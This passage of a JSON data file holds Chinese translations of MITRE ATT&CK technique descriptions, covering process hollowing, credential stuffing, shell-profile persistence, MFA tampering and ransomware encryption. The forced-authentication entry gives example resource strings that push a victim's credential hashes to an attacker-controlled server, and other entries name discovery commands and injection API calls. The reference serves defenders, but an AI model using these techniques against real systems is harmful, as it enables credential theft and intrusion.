        "translated_description": "对手可能会滥用Lua命令和脚本进行执行。Lua是一种跨平台的脚本和编程语言，主要设计用于嵌入应用程序中。Lua可以通过命令行（通过独立的lua解释器）、脚本（<code>.lua</code>）或从Lua嵌入程序（通过<code>struct lua_State</code>）执行。(引用: Lua main page)(引用: Lua state)\n\n对手可能会执行Lua脚本以实现恶意目的。对手可能会整合、滥用或替换现有的Lua解释器，以允许在运行时执行恶意Lua命令。(引用: PoetRat Lua)(引用: Lua Proofpoint Sunseed)(引用: Cyphort EvilBunny)(引用: Kaspersky Lua)"
    },
    "Indicator Removal from Tools": {
        "translated_name": "从工具中删除指标",
        "translated_description": "如果对手认为其恶意工具被检测到、隔离或以其他方式受限，他们可能会从工具中删除指标。他们可以通过删除指标来修改工具，并使用更新版本，该版本不再被目标的防御系统或可能使用类似系统的后续目标检测到。\n\n一个很好的例子是，当恶意软件被文件签名检测到并被防病毒软件隔离时。如果对手能够确定恶意软件因其文件签名而被隔离，他们可能会修改文件以明确避免该签名，然后重新使用恶意软件。"
    },
    "Malicious Image": {
        "translated_name": "恶意镜像",
        "translated_description": "对手可能依赖用户运行恶意镜像来促进执行。Amazon Web Services (AWS) Amazon Machine Images (AMIs)、Google Cloud Platform (GCP) Images 和 Azure Images 以及流行的容器运行时（如 Docker）都可能被后门化。后门化的镜像可能通过[上传恶意软件](https://attack.mitre.org/techniques/T1608/001)上传到公共存储库，用户可能会在不知情的情况下下载并部署来自镜像的实例或容器，从而绕过专门实现初始访问的技术。这可能导致在实例或容器中执行恶意代码，例如执行加密货币挖矿的代码。(引用: Summit Route Malicious AMIs)\n\n对手还可能通过命名镜像的方式增加用户错误部署实例或容器的机会（例如：[匹配合法名称或位置](https://attack.mitre.org/techniques/T1036/005)）。(引用: Aqua Security Cloud Native Threat Report June 2021)"
    },
    "Container Service": {
        "translated_name": "容器服务",
        "translated_description": "对手可能会创建或修改在单个主机上作为守护进程、代理或服务运行的容器或容器集群管理工具。这些工具包括用于创建和管理单个容器的软件，如 Docker 和 Podman，以及容器集群节点级代理，如 kubelet。通过修改这些服务，对手可能能够在主机上实现持久性或提升其权限。\n\n例如，通过使用带有 `restart=always` 指令的 `docker run` 或 `podman run` 命令，可以将容器配置为在主机上持久重启。(引用: AquaSec TeamTNT 2023) 具有（root）docker 命令访问权限的用户也可能能够在主机上提升其权限。(引用: GTFOBins Docker)\n\n在 Kubernetes 环境中，DaemonSets 允许对手在所有节点上持久性地[部署容器](https://attack.mitre.org/techniques/T1610)，包括后来添加到集群中的节点。(引用: Aquasec Kubernetes Attack 2023)(引用: Kubernetes DaemonSet) 可以使用 pod 规范中的 `nodeSelector` 或 `nodeName` 字段将 Pod 部署到特定节点。(引用: Kubernetes Assigning Pods to Nodes)(引用: AppSecco Kubernetes Namespace Breakout 2020)\n\n请注意，容器也可以配置为作为[Systemd 服务](https://attack.mitre.org/techniques/T1543/002)运行。(引用: Podman Systemd)(引用: Docker Systemd)"
    },
    "Valid Accounts": {
        "translated_name": "有效账户",
        "translated_description": "对手可能会获取和滥用现有账户的凭据，作为获得初始访问、持久性、权限提升或规避防御的一种手段。被破坏的凭据可能用于绕过系统内各种资源上的访问控制，甚至可能用于对远程系统和外部可用服务（如 VPN、Outlook Web Access、网络设备和远程桌面）的持久访问。(引用: volexity_0day_sophos_FW) 被破坏的凭据还可能授予对手对特定系统的更高权限或对网络中受限区域的访问权限。对手可能选择不使用恶意软件或工具，而是利用这些凭据提供的合法访问权限，使其存在更难被检测到。\n\n在某些情况下，对手可能会滥用不活跃的账户：例如，那些属于不再是组织成员的个人的账户。使用这些账户可能使对手能够规避检测，因为原账户用户不会在场，无法识别其账户上发生的任何异常活动。(引用: CISA MFA PrintNightmare)\n\n由于本地、域和云账户在系统网络中的权限重叠，对手可能能够跨账户和系统进行横向移动，以达到高水平的访问（即域或企业管理员），从而绕过企业内部设置的访问控制。(引用: TechNet Credential Theft)"
    },
    "Non-Standard Port": {
        "translated_name": "非标准端口",
        "translated_description": "对手可能会使用通常不相关的协议和端口配对进行通信。例如，HTTPS 使用端口 8088(引用: Symantec Elfin Mar 2019) 或端口 587(引用: Fortinet Agent Tesla April 2018)，而不是传统的端口 443。对手可能会更改协议使用的标准端口，以绕过过滤或混淆网络数据的分析/解析。\n\n对手还可能更改受害者系统以滥用非标准端口。例如，可以使用注册表键和其他配置设置来修改协议和端口配对。(引用: change_rdp_port_conti)"
    },
    "Process Hollowing": {
        "translated_name": "进程空洞化",
        "translated_description": "对手可能会将恶意代码注入挂起和空洞化的进程中，以规避基于进程的防御。进程空洞化是一种在单独的活动进程地址空间中执行任意代码的方法。\n\n进程空洞化通常通过在挂起状态下创建进程，然后取消映射/空洞化其内存来执行，随后可以用恶意代码替换。可以使用本机 Windows API 调用（如 <code>CreateProcess</code>）创建受害进程，其中包括一个标志以挂起进程的主线程。此时，可以使用 API 调用（如 <code>ZwUnmapViewOfSection</code> 或 <code>NtUnmapViewOfSection</code>）取消映射进程，然后通过 <code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code> 和 <code>ResumeThread</code> 分别写入、重新对齐到注入的代码并恢复。(引用: Leitch Hollowing)(引用: Elastic Process Injection July 2017)\n\n这与[线程本地存储](https://attack.mitre.org/techniques/T1055/005)非常相似，但创建的是新进程，而不是针对现有进程。由于注入的进程是从（并因此继承了安全上下文）注入进程生成的，因此这种行为可能不会导致权限提升。然而，通过进程空洞化执行可能会规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "Exploitation for Privilege Escalation": {
        "translated_name": "利用权限提升",
        "translated_description": "对手可能会利用软件漏洞尝试提升权限。利用软件漏洞是指对手利用程序、服务或操作系统软件或内核本身中的编程错误来执行对手控制的代码。安全构造（如权限级别）通常会阻碍对信息的访问和某些技术的使用，因此对手可能需要执行权限提升，包括使用软件漏洞利用来规避这些限制。\n\n在最初获得系统访问权限时，对手可能在较低权限的进程中操作，这将阻止他们访问系统上的某些资源。可能存在漏洞，通常在操作系统组件和常见的高权限运行的软件中，可以利用这些漏洞在系统上获得更高的访问权限。这可能使某人能够从无特权或用户级权限移动到 SYSTEM 或 root 权限，具体取决于易受攻击的组件。这也可能使对手能够从虚拟化环境（如虚拟机或容器内）移动到底层主机。这可能是对手妥协已正确配置并限制其他权限提升方法的端点系统的必要步骤。\n\n对手可能会将签名的易受攻击驱动程序带到被破坏的机器上，以便他们可以利用漏洞在内核模式下执行代码。这个过程有时被称为带上你自己的易受攻击驱动程序（BYOVD）。(引用: ESET InvisiMole June 2020)(引用: Unit42 AcidBox June 2020) 对手可能会在初始访问期间包含易受攻击的驱动程序文件，或通过[入口工具传输](https://attack.mitre.org/techniques/T1105)或[横向工具传输](https://attack.mitre.org/techniques/T1570)下载到被破坏的系统。"
    },
    "Resource Forking": {
        "translated_name": "资源分叉",
        "translated_description": "对手可能会滥用资源分叉来隐藏恶意代码或可执行文件，以规避检测并绕过安全应用程序。资源分叉为应用程序提供了一种结构化的方式来存储资源，例如缩略图图像、菜单定义、图标、对话框和代码。(引用: macOS 分层文件系统概述) 使用资源分叉在显示文件的扩展属性时是可识别的，使用<code>ls -l@</code>或<code>xattr -l</code>命令。资源分叉已被弃用，并被应用程序包结构取代。非本地化资源放置在应用程序包的顶级目录中，而本地化资源放置在<code>/Resources</code>文件夹中。(引用: 资源和数据分叉)(引用: ELC 扩展属性)\n\n对手可以使用资源分叉来隐藏可能直接存储在文件中的恶意数据。对手可以在指定的偏移量处执行带有附加资源分叉的内容，该内容被移动到可执行位置然后调用。资源分叉内容也可能在执行前被混淆/加密。(引用: sentinellabs 资源命名分叉 2020)(引用: tau bundlore erika noerenberg 2020)"
    },
    "Account Access Removal": {
        "translated_name": "账户访问移除",
        "translated_description": "对手可能通过禁止合法用户访问账户来中断系统和网络资源的可用性。账户可能被删除、锁定或操作（例如：更改凭据）以移除对账户的访问。对手还可能随后注销和/或执行[系统关闭/重启](https://attack.mitre.org/techniques/T1529)以设置恶意更改。(引用: CarbonBlack LockerGoga 2019)(引用: Unit42 LockerGoga 2019)\n\n在Windows中，[Net](https://attack.mitre.org/software/S0039)实用程序、<code>Set-LocalUser</code>和<code>Set-ADAccountPassword</code>[PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets可能被对手用来修改用户账户。在Linux中，可以使用<code>passwd</code>实用程序更改密码。账户也可以通过组策略禁用。\n\n使用勒索软件或类似攻击的对手可能首先执行此行为和其他影响行为，例如[数据销毁](https://attack.mitre.org/techniques/T1485)和[篡改](https://attack.mitre.org/techniques/T1491)，以在完成[数据加密以产生影响](https://attack.mitre.org/techniques/T1486)目标之前阻碍事件响应/恢复。"
    },
    "Credential Stuffing": {
        "translated_name": "凭证填充",
        "translated_description": "对手可能会使用从不相关账户的泄露转储中获得的凭证，通过凭证重叠来访问目标账户。偶尔，当网站或服务被破坏并访问用户账户凭证时，大量用户名和密码对会在线泄露。对于试图利用用户在个人和业务账户中使用相同密码倾向的对手来说，这些信息可能是有用的。\n\n凭证填充是一种风险较高的选项，因为它可能导致大量身份验证失败和账户锁定，具体取决于组织的登录失败策略。\n\n通常，管理服务通过常用端口在填充凭证时使用。常见的目标服务包括以下内容：\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / 终端服务 (3389/TCP)\n* HTTP/HTTP 管理服务 (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\n除了管理服务外，对手还可能“针对使用联合身份验证协议的单点登录 (SSO) 和基于云的应用程序”，以及外部电子邮件应用程序，例如 Office 365。(引用: US-CERT TA18-068A 2018)"
    },
    "Obfuscated Files or Information": {
        "translated_name": "混淆的文件或信息",
        "translated_description": "对手可能会尝试通过加密、编码或以其他方式混淆其内容，使可执行文件或文件难以发现或分析。这是常见的行为，可以跨不同平台和网络使用，以规避防御。\n\n有效载荷可能会被压缩、归档或加密，以避免检测。这些有效载荷可能在初始访问期间使用，也可能在以后使用以减轻检测。有时需要用户操作来打开和[解混淆/解码文件或信息](https://attack.mitre.org/techniques/T1140)以进行[用户执行](https://attack.mitre.org/techniques/T1204)。用户还可能需要输入密码以打开对手提供的密码保护的压缩/加密文件。(引用: Volexity PowerDuke 2016 年 11 月) 对手还可能使用压缩或归档的脚本，例如 JavaScript。\n\n文件的部分内容也可以被编码，以隐藏原本有助于防御者发现的明文字符串。(引用: Linux/Cdorked.A 我们生活的安全分析) 有效载荷也可能被拆分成单独的、看似无害的文件，只有在重新组装时才会显示恶意功能。(引用: Carbon Black 混淆 2016 年 9 月)\n\n对手还可能滥用[命令混淆](https://attack.mitre.org/techniques/T1027/010)来混淆从有效载荷或直接通过[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)执行的命令。环境变量、别名、字符和其他平台/语言特定的语义可以用来规避基于签名的检测和应用程序控制机制。(引用: FireEye 混淆 2017 年 6 月) (引用: FireEye Revoke-Obfuscation 2017 年 7 月)(引用: PaloAlto EncodedCommand 2017 年 3 月)"
    },
    "Multi-Factor Authentication": {
        "translated_name": "多因素认证",
        "translated_description": "对手可能会禁用或修改多因素认证 (MFA) 机制，以便对被破坏的账户进行持久访问。\n\n一旦对手通过破坏缺乏 MFA 的账户或使用 MFA 绕过方法（例如[多因素认证请求生成](https://attack.mitre.org/techniques/T1621)）获得对网络的访问权限，对手可能会利用其访问权限修改或完全禁用 MFA 防御。这可以通过滥用合法功能来实现，例如将用户排除在 Azure AD 条件访问策略之外，注册新的但易受攻击/对手控制的 MFA 方法，或通过手动修补 MFA 程序和配置文件以绕过预期功能。(引用: Mandiant APT42)(引用: Azure AD 条件访问排除)\n\n例如，修改 Windows 主机文件 (`C:\\windows\\system32\\drivers\\etc\\hosts`) 以将 MFA 调用重定向到本地主机而不是 MFA 服务器，可能会导致 MFA 过程失败。如果存在“失败开放”策略，则任何其他成功的身份验证尝试可能会在不强制执行 MFA 的情况下被授予访问权限。(引用: 俄罗斯人利用默认 MFA 协议 - CISA 2022 年 3 月)\n\n根据对手的范围、目标和权限，MFA 防御可能会针对单个账户或与更大组相关的所有账户（例如受害者网络环境中的所有域账户）被禁用。(引用: 俄罗斯人利用默认 MFA 协议 - CISA 2022 年 3 月)"
    },
    "Remote Email Collection": {
        "translated_name": "远程电子邮件收集",
        "translated_description": "对手可能会针对 Exchange 服务器、Office 365 或 Google Workspace 收集敏感信息。对手可能会利用用户的凭证并直接与 Exchange 服务器交互，以从网络内部获取信息。对手还可能访问外部 Exchange 服务、Office 365 或 Google Workspace，以使用凭证或访问令牌访问电子邮件。工具如[MailSniper](https://attack.mitre.org/software/S0413)可以用来自动搜索特定关键字。"
    },
    "IIS Components": {
        "translated_name": "IIS 组件",
        "translated_description": "对手可能会安装在 Internet 信息服务 (IIS) Web 服务器上运行的恶意组件以建立持久性。IIS 提供了几种扩展 Web 服务器功能的机制。例如，可以安装 Internet 服务器应用程序编程接口 (ISAPI) 扩展和筛选器来检查和/或修改传入和传出的 IIS Web 请求。扩展和筛选器作为 DLL 文件部署，导出三个函数：<code>Get{Extension/Filter}Version</code>、<code>Http{Extension/Filter}Proc</code> 和（可选）<code>Terminate{Extension/Filter}</code>。还可以安装 IIS 模块以扩展 IIS Web 服务器。(引用: Microsoft ISAPI Extension Overview 2017)(引用: Microsoft ISAPI Filter Overview 2017)(引用: IIS Backdoor 2011)(引用: Trustwave IIS Module 2013)\n\n对手可能会安装恶意 ISAPI 扩展和筛选器来观察和/或修改流量、在受感染的机器上执行命令或代理命令和控制流量。ISAPI 扩展和筛选器可能有权访问所有 IIS Web 请求和响应。例如，对手可能会滥用这些机制来修改 HTTP 响应，以便将恶意命令/内容分发到先前受感染的主机。(引用: Microsoft ISAPI Filter Overview 2017)(引用: Microsoft ISAPI Extension Overview 2017)(引用: Microsoft ISAPI Extension All Incoming 2017)(引用: Dell TG-3390)(引用: Trustwave IIS Module 2013)(引用: MMPC ISAPI Filter 2012)\n\n对手还可能安装恶意 IIS 模块来观察和/或修改流量。IIS 7.0 引入的模块提供与 ISAPI 扩展和筛选器相同的对 HTTP 请求和响应的不受限制的访问。IIS 模块可以编写为导出 <code>RegisterModule</code> 的 DLL，或作为 .NET 应用程序与 ASP.NET API 交互以访问 IIS HTTP 请求。(引用: Microsoft IIS Modules Overview 2007)(引用: Trustwave IIS Module 2013)(引用: ESET IIS Malware 2021)"
    },
    "Invalid Code Signature": {
        "translated_name": "无效代码签名",
        "translated_description": "对手可能会尝试模仿有效代码签名的特征，以增加欺骗用户、分析师或工具的机会。代码签名为开发人员提供了对二进制文件的真实性保证，并保证二进制文件未被篡改。对手可以复制签名程序的元数据和签名信息，然后将其用作未签名程序的模板。具有无效代码签名的文件将无法通过数字签名验证检查，但它们可能看起来更合法，用户和安全工具可能会错误地处理这些文件。(引用: Threatexpress MetaTwin 2017)\n\n与[代码签名](https://attack.mitre.org/techniques/T1553/002)不同，此活动不会导致有效签名。"
    },
    "Run Virtual Instance": {
        "translated_name": "运行虚拟实例",
        "translated_description": "对手可能会使用虚拟实例执行恶意操作以避免检测。存在多种虚拟化技术，可以模拟计算机或计算环境。通过在虚拟实例中运行恶意代码，对手可以隐藏与其行为相关的工件，使安全工具无法监控虚拟实例内的活动。此外，根据虚拟网络实现（例如：桥接适配器），虚拟实例生成的网络流量可能难以追溯到受感染的主机，因为 IP 地址和主机名可能不匹配已知值。(引用: SingHealth Breach Jan 2019)\n\n对手可能会利用虚拟化的本机支持（例如：Hyper-V）或放置运行虚拟实例所需的文件（例如：VirtualBox 二进制文件）。在运行虚拟实例后，对手可能会在来宾和主机之间创建一个共享文件夹，权限允许虚拟实例与主机文件系统交互。(引用: Sophos Ragnar May 2020)"
    },
    "Polymorphic Code": {
        "translated_name": "多态代码",
        "translated_description": "对手可能会利用多态代码（也称为变形或变异代码）来规避检测。多态代码是一种能够在代码执行期间更改其运行时足迹的软件类型。(引用: polymorphic-blackberry) 每次执行软件时，代码都会变异成不同版本的自身，达到与原始代码相同的目的或目标。此功能使恶意软件能够规避传统的基于签名的防御，例如防病毒和反恶意软件工具。(引用: polymorphic-sentinelone) \n其他混淆技术可以与多态代码结合使用，以实现预期效果，包括使用变异引擎执行操作，例如[软件打包](https://attack.mitre.org/techniques/T1027/002)、[命令混淆](https://attack.mitre.org/techniques/T1027/010)或[加密/编码文件](https://attack.mitre.org/techniques/T1027/013)。(引用: polymorphic-linkedin)(引用: polymorphic-medium)\n"
    },
    "Password Policy Discovery": {
        "translated_name": "密码策略发现",
        "translated_description": "对手可能会尝试访问有关企业网络或云环境中使用的密码策略的详细信息。密码策略是一种强制执行复杂密码的方法，这些密码难以通过[暴力破解](https://attack.mitre.org/techniques/T1110)猜测或破解。此信息可能有助于对手创建常见密码列表并启动符合策略的字典和/或暴力破解攻击（例如，如果最小密码长度应为 8，则不尝试“pass123”之类的密码；如果锁定设置为 6，则每个账户不检查超过 3-4 个密码，以免锁定账户）。\n\n可以通过各种命令 shell 实用程序在 Windows、Linux 和 macOS 系统上设置和发现密码策略，例如 <code>net accounts (/domain)</code>、<code>Get-ADDefaultDomainPasswordPolicy</code>、<code>chage -l <username></code>、<code>cat /etc/pam.d/common-password</code> 和 <code>pwpolicy getaccountpolicies</code> (引用: Superuser Linux Password Policies) (引用: Jamf User Password Policies)。对手还可能利用网络设备上的[网络设备 CLI](https://attack.mitre.org/techniques/T1059/008)发现密码策略信息（例如 <code>show aaa</code>、<code>show aaa common-criteria policy all</code>）。(引用: US-CERT-TA18-106A)\n\n可以使用可用的 API 在云环境中发现密码策略，例如 AWS 中的 <code>GetAccountPasswordPolicy</code> (引用: AWS GetPasswordPolicy)。"
    },
    "Event Triggered Execution": {
        "translated_name": "事件触发执行",
        "translated_description": "对手可能会使用基于特定事件触发执行的系统机制来建立持久性和/或提升权限。各种操作系统都有监视和订阅事件（例如登录或运行特定应用程序/二进制文件等用户活动）的手段。云环境还可能支持各种功能和服务，这些功能和服务可以监视并响应特定的云事件。(引用: Backdooring an AWS account)(引用: Varonis Power Automate Data Exfiltration)(引用: Microsoft DART Case Report 001)\n\n对手可能会滥用这些机制，作为通过重复执行恶意代码来保持对受害者的持久访问的一种手段。在获得受害者系统访问权限后，对手可能会创建/修改事件触发器以指向将在调用事件触发器时执行的恶意内容。(引用: FireEye WMI 2015)(引用: Malware Persistence on OS X)(引用: amnesia malware)\n\n由于执行可以由具有更高权限的账户（例如 SYSTEM 或服务账户）代理，因此对手可能会滥用这些触发的执行机制来提升其权限。"
    },
    "Unix Shell Configuration Modification": {
        "translated_name": "Unix Shell 配置修改",
        "translated_description": "对手可能通过执行由用户的 shell 触发的恶意命令来建立持久性。用户[Unix Shell](https://attack.mitre.org/techniques/T1059/004)在会话的不同点执行几个配置脚本，基于事件。例如，当用户打开命令行界面或远程登录（例如通过 SSH）时，会启动登录 shell。登录 shell 从系统 (<code>/etc</code>) 和用户的主目录 (<code>~/</code>) 执行脚本以配置环境。系统上的所有登录 shell 都使用 /etc/profile 启动。这些配置脚本以其目录的权限级别运行，通常用于设置环境变量、创建别名和自定义用户的环境。当 shell 退出或终止时，将执行其他 shell 脚本以确保 shell 正常退出。\n\n对手可能会尝试通过将命令插入到 shell 自动执行的脚本中来建立持久性。以 bash 为例，大多数 GNU/Linux 系统的默认 shell，对手可能会将启动恶意二进制文件的命令添加到 <code>/etc/profile</code> 和 <code>/etc/profile.d</code> 文件中。(引用: intezer-kaiji-malware)(引用: bencane blog bashrc) 这些文件通常需要 root 权限才能修改，并且每次系统上的任何 shell 启动时都会执行。对于用户级权限，对手可以将恶意命令插入 <code>~/.bash_profile</code>、<code>~/.bash_login</code> 或 <code>~/.profile</code>，这些命令在用户打开命令行界面或远程连接时会被调用。(引用: anomali-rocke-tactics)(引用: Linux manual bash invocation) 由于系统仅执行列表顺序中的第一个现有文件，因此对手使用 <code>~/.bash_profile</code> 来确保执行。对手还利用 <code>~/.bashrc</code> 文件，如果连接是远程建立的或打开了额外的交互式 shell（例如命令行界面中的新选项卡），则会额外执行。(引用: Tsunami)(引用: anomali-rocke-tactics)(引用: anomali-linux-rabbit)(引用: Magento) 一些恶意软件在程序终止时触发执行，对手可以使用 <code>~/.bash_logout</code> 文件在会话结束时执行恶意命令。\n\n对于 macOS，此技术的功能类似，但可能利用 zsh，这是 macOS 10.15+ 的默认 shell。当打开 Terminal.app 时，应用程序会启动 zsh 登录 shell 和 zsh 交互式 shell。登录 shell 使用 <code>/etc/profile</code>、<code>/etc/zshenv</code>、<code>/etc/zprofile</code> 和 <code>/etc/zlogin</code> 配置系统环境。(引用: ScriptingOSX zsh)(引用: PersistentJXA_leopitt)(引用: code_persistence_zsh)(引用: macOS MS office sandbox escape) 然后，登录 shell 使用 <code>~/.zprofile</code> 和 <code>~/.zlogin</code> 配置用户环境。交互式 shell 使用 <code>~/.zshrc</code> 配置用户环境。退出时，执行 <code>/etc/zlogout</code> 和 <code>~/.zlogout</code>。对于旧版程序，macOS 在启动时执行 <code>/etc/bashrc</code>。"
    },
    "Forced Authentication": {
        "translated_name": "强制身份验证",
        "translated_description": "对手可能通过调用或强制用户自动提供身份验证信息来收集凭证材料，这些信息可以被对手拦截。\n\n服务器消息块 (SMB) 协议通常用于 Windows 网络中的身份验证和系统之间的通信，以访问资源和文件共享。当 Windows 系统尝试连接到 SMB 资源时，它会自动尝试进行身份验证并将当前用户的凭证信息发送到远程系统。(引用: Wikipedia Server Message Block) 这种行为在企业环境中很常见，因此用户无需输入凭证即可访问网络资源。\n\nWeb 分布式创作和版本控制 (WebDAV) 也是 Windows 系统在 SMB 被阻止或失败时通常使用的备份协议。WebDAV 是 HTTP 的扩展，通常通过 TCP 端口 80 和 443 运行。(引用: Didier Stevens WebDAV Traffic) (引用: Microsoft Managing WebDAV Security)\n\n对手可能利用这种行为，通过强制 SMB/WebDAV 身份验证来获取用户账户哈希。对手可以通过鱼叉式网络钓鱼发送包含指向对手控制的外部服务器的资源链接的附件（即[模板注入](https://attack.mitre.org/techniques/T1221)），或者将特制文件放置在特权账户的导航路径上（例如，放置在桌面上的 .SCF 文件）或放置在公共可访问的共享上，以供受害者访问。当用户的系统访问不受信任的资源时，它会尝试进行身份验证并通过 SMB 将信息（包括用户的哈希凭证）发送到对手控制的服务器。(引用: GitHub Hashjacking) 通过访问凭证哈希，对手可以进行离线[暴力破解](https://attack.mitre.org/techniques/T1110)以获取明文凭证。(引用: Cylance Redirect to SMB)\n\n这种情况可能以多种方式发生。(引用: Osanda Stealing NetNTLM Hashes) 一些实际使用的具体示例包括：\n\n* 包含自动加载资源的文档的鱼叉式网络钓鱼附件，当文档打开时会触发 SMB 请求（即[模板注入](https://attack.mitre.org/techniques/T1221)）。例如，文档可以包含类似 <code>file[:]//[remote address]/Normal.dotm</code> 的请求以触发 SMB 请求。(引用: US-CERT APT Energy Oct 2017)\n* 修改的 .LNK 或 .SCF 文件，其图标文件名指向外部引用，例如 <code>\\\\[remote address]\\pic.png</code>，当图标呈现时会强制系统加载资源，以反复收集凭证。(引用: US-CERT APT Energy Oct 2017)"
    },
    "SID-History Injection": {
        "translated_name": "SID 历史注入",
        "translated_description": "对手可能使用 SID 历史注入来提升权限并绕过访问控制。Windows 安全标识符 (SID) 是标识用户或组账户的唯一值。SID 由 Windows 安全性在安全描述符和访问令牌中使用。(引用: Microsoft SID) 账户可以在 SID-History Active Directory 属性中保存其他 SID 值(引用: Microsoft SID-History Attribute)，允许域之间的互操作账户迁移（例如，SID-History 中的所有值都包含在访问令牌中）。\n\n通过域管理员（或等效）权限，可以插入收集到的或众所周知的 SID 值(引用: Microsoft Well Known SIDs Jun 2017) 到 SID-History 中，以便模拟任意用户/组，例如企业管理员。这种操作可能导致对本地资源的提升访问权限和/或通过横向移动技术（如[远程服务](https://attack.mitre.org/techniques/T1021)、[SMB/Windows 管理共享](https://attack.mitre.org/techniques/T1021/002) 或 [Windows 远程管理](https://attack.mitre.org/techniques/T1021/006)）访问其他无法访问的域。"
    },
    "Network Boundary Bridging": {
        "translated_name": "网络边界桥接",
        "translated_description": "对手可能通过破坏外围网络设备或负责网络分段的内部设备来桥接网络边界。破坏这些设备可能使对手能够绕过流量路由限制，从而将受信任和不受信任的网络分开。\n\n路由器和防火墙等设备可用于在受信任和不受信任的网络之间创建边界。它们通过限制流量类型来执行组织策略，以减少此类连接固有的风险。流量限制可以通过禁止 IP 地址、层 4 协议端口或通过深度包检测来识别应用程序来实现。为了与网络的其余部分进行通信，这些设备可以是直接可寻址的或透明的，但它们的操作模式对对手如何在被破坏时绕过它们没有影响。\n\n当对手控制了这样的边界设备时，他们可以绕过其策略执行，将通常被禁止的流量跨越信任边界传输到两个分离的网络之间而不受阻碍。通过获得设备上的足够权限，对手可以重新配置设备以允许他们想要的流量，然后他们可以进一步实现目标，例如通过[多跳代理](https://attack.mitre.org/techniques/T1090/003)进行命令和控制或通过[流量复制](https://attack.mitre.org/techniques/T1020/001)进行数据外传。对手还可能针对负责网络分段的内部设备，并结合[内部代理](https://attack.mitre.org/techniques/T1090/001)滥用这些设备以实现相同的目标。(引用: Kaspersky ThreatNeedle Feb 2021) 在边界设备分隔两个不同组织的情况下，对手还可以促进横向移动到新的受害者环境中。"
    },
    "Data Encrypted for Impact": {
        "translated_name": "数据加密以产生影响",
        "translated_description": "对手可能会加密目标系统或网络中大量系统上的数据，以中断系统和网络资源的可用性。他们可以尝试通过加密本地和远程驱动器上的文件或数据并拒绝访问解密密钥来使存储的数据不可访问。这可能是为了从受害者那里提取货币补偿以换取解密或解密密钥（勒索软件），或者在未保存或传输密钥的情况下使数据永久不可访问。(引用: US-CERT Ransomware 2016)(引用: FireEye WannaCry 2017)(引用: US-CERT NotPetya 2017)(引用: US-CERT SamSam 2018)\n\n在勒索软件的情况下，通常会加密常见的用户文件，如 Office 文档、PDF、图像、视频、音频、文本和源代码文件（通常重命名和/或标记为特定文件标记）。对手可能需要首先采用其他行为，例如[文件和目录权限修改](https://attack.mitre.org/techniques/T1222)或[系统关闭/重启](https://attack.mitre.org/techniques/T1529)，以解锁和/或获取访问权限来操作这些文件。(引用: CarbonBlack Conti July 2020) 在某些情况下，对手可能会加密关键系统文件、磁盘分区和 MBR。(引用: US-CERT NotPetya 2017)\n\n为了最大限度地影响目标组织，设计用于加密数据的恶意软件可能具有类似蠕虫的功能，通过利用其他攻击技术（如[有效账户](https://attack.mitre.org/techniques/T1078)、[操作系统凭据转储](https://attack.mitre.org/techniques/T1003) 和 [SMB/Windows 管理共享](https://attack.mitre.org/techniques/T1021/002)）在网络中传播。(引用: FireEye WannaCry 2017)(引用: US-CERT NotPetya 2017) 加密恶意软件还可能利用[内部篡改](https://attack.mitre.org/techniques/T1491/001)，例如更改受害者的壁纸，或通过向连接的打印机发送勒索信或其他消息（称为“打印轰炸”）来恐吓受害者。(引用: NHS Digital Egregor Nov 2020)\n\n在云环境中，受损账户内的存储对象也可能被加密。(引用: Rhino S3 Ransomware Part 1)"
    },
    "Subvert Trust Controls": {
        "translated_name": "颠覆信任控制",
        "translated_description": "对手可能会破坏安全控制，这些控制将警告用户不受信任的活动或阻止不受信任程序的执行。操作系统和安全产品可能包含识别程序或网站具有某种信任级别的机制。这些功能的示例包括允许程序运行，因为它由有效的代码签名证书签名，程序提示用户警告，因为它具有从互联网下载的属性，或指示您即将连接到不受信任的网站。\n\n对手可能会尝试颠覆这些信任机制。对手使用的方法将取决于他们试图颠覆的具体机制。对手可能会进行[文件和目录权限修改](https://attack.mitre.org/techniques/T1222)或[修改注册表](https://attack.mitre.org/techniques/T1112)以支持颠覆这些控制。(引用: SpectorOps Subverting Trust Sept 2017) 对手还可能创建或窃取代码签名证书以在目标系统上获得信任。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates)"
    },
    "Elevated Execution with Prompt": {
        "translated_name": "带提示的提升执行",
        "translated_description": "对手可能利用 <code>AuthorizationExecuteWithPrivileges</code> API 通过提示用户输入凭证来提升权限。(引用: AppleDocs AuthorizationExecuteWithPrivileges) 该 API 的目的是为应用程序开发人员提供一种简单的方法来执行具有 root 权限的操作，例如应用程序安装或更新。此 API 不会验证请求 root 权限的程序是否来自可信来源或是否被恶意修改。\n\n尽管此 API 已被弃用，但在最新版本的 macOS 中仍然完全有效。调用此 API 时，用户将被提示输入其凭证，但不会对程序的来源或完整性进行检查。调用 API 的程序还可以加载可写的文件，这些文件可以被修改以执行具有提升权限的恶意行为。\n\n对手可能会滥用 <code>AuthorizationExecuteWithPrivileges</code> 以获得 root 权限，从而在受害者上安装恶意软件并安装持久性机制。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019)(引用: OSX Coldroot RAT) 此技术可能与[伪装](https://attack.mitre.org/techniques/T1036)结合使用，以欺骗用户授予恶意代码提升的权限。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019) 此技术还已被证明可以通过修改机器上使用此 API 的合法程序来工作。(引用: Death by 1000 installers; it's all broken!)"
    },
    "Firmware": {
        "translated_name": "固件",
